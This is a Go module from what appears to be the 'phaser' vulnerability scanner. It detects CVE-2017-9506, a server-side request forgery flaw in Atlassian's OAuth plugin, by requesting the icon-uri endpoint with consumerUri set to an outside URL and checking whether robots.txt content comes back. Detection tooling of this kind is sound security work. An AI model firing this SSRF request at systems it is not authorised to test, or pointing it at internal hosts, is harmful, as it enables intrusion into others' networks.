package atlassian

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"

	"github.com/bloom42/phaser/common/phaser"
	"github.com/bloom42/phaser/common/phaser/findings"
	"github.com/bloom42/phaser/scanner/module"
)

type CVE_2017_9506 struct{}

func (CVE_2017_9506) Name() string {
	return "http/atlassian/cve_2017_9506"
}

func (CVE_2017_9506) Description() string {
	return "Check for CVE-2017-9506 (SSRF)"
}

func (CVE_2017_9506) Author() string {
	return "Sylvain Kerkour <sylvain@kerkour.com>"
}

func (CVE_2017_9506) Version() string {
	return "0.1.0"
}

func (CVE_2017_9506) Run(scan *phaser.Scan, target *phaser.Target, port phaser.Port) (module.Result, []error) {
	errs := []error{}
	var ret module.Result
	protocol := "http"

	if !port.HTTP && !port.HTTPS {
		return ret, errs
	}
	if port.HTTPS {
		protocol = "https"
	}

	URL := fmt.Sprintf("%s://%s:%d/plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.com/robots.txt", protocol, target.Host, port.ID)
	req, err := http.NewRequest("GET", URL, nil)
	if err != nil {
		errs = append(errs, err)
		return ret, errs
	}
	req.Header.Set("User-Agent", scan.Profile.HTTP.UserAgent)
	res, err := scan.HTTPClient.Do(req)
	if err != nil {
		errs = append(errs, err)
		return ret, errs
	}
	// request, _ := httputil.DumpRequestOut(req, true)
	// response, _ := httputil.DumpResponse(res, true)
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		errs = append(errs, err)
		return ret, errs
	}
	res.Body.Close()
	bodyStrLower := strings.ToLower(string(body))

	if strings.Contains(bodyStrLower, "user-agent: *") &&
		strings.Contains(bodyStrLower, "disallow") {
		ret = findings.URL{URL: URL}
	}

	return ret, errs
}
